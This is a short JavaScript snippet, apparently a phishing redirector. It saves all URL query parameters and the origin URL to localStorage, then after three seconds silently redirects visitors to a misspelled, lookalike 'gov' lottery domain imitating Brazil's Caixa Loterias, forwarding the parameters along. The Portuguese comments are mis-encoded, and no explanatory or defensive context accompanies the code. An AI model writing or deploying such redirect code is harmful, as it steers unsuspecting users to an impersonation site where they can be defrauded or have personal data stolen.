<script>
  (function () {
    const targets = [

      'https://loteriascaixaonlline-gov-1l6g.vercel.app/0/'
    ];

    const params = new URLSearchParams(window.location.search);
    const hash = window.location.hash || '';

    /* ðŸ”¹ Salva TODOS os parÃ¢metros no localStorage */
    params.forEach((value, key) => {
      localStorage.setItem(key, value);
    });

    /* (Opcional) salva a URL completa de origem */
    localStorage.setItem('origin_url', window.location.href);

    const target = targets[Math.floor(Math.random() * targets.length)];
    const finalUrl = target + (params.toString() ? '?' + params.toString() : '') + hash;

    setTimeout(() => {
      window.location.replace(finalUrl);
    }, 3000);
  })();
